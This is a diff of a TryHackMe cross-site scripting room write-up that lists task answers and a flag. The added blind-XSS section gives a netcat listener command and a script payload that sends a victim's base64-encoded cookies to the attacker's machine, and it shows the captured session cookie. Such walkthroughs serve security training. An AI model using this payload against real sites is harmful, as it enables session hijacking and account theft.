@@ -1,4 +1,4 @@
-# Task 1
+# Task 1 - Room Brief
 
 R/ **Cross-site Scripting**
 
@@ -45,3 +45,13 @@ R/ **stored xss**
 # Task 7 - Perfecting your payload
 
 R/ **THM{XSS_MASTER}**
+
+# Task 8 - Practical Example (Blind XSS)
+
+First of all you need to create a listening port on your machine or TryHackMe AttackBox. Using the following command you will be able to set up the port: **nc -nlvp 9001**.
+
+Then, you can execute the payload in order to get the victim's cookies. Payload: **</textarea><script>fetch('http:// YOUR MACHINE IP:9001?cookie=' + btoa(document.cookie));</script>**.
+
+Finally, when the payload has been executed. You will receive the victim's cookies, which it will be encode on base64. Cookie value: **c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==**
+
+To decode the cookie I used CyberChef site. Once decoded it you will get the response to complete the room.
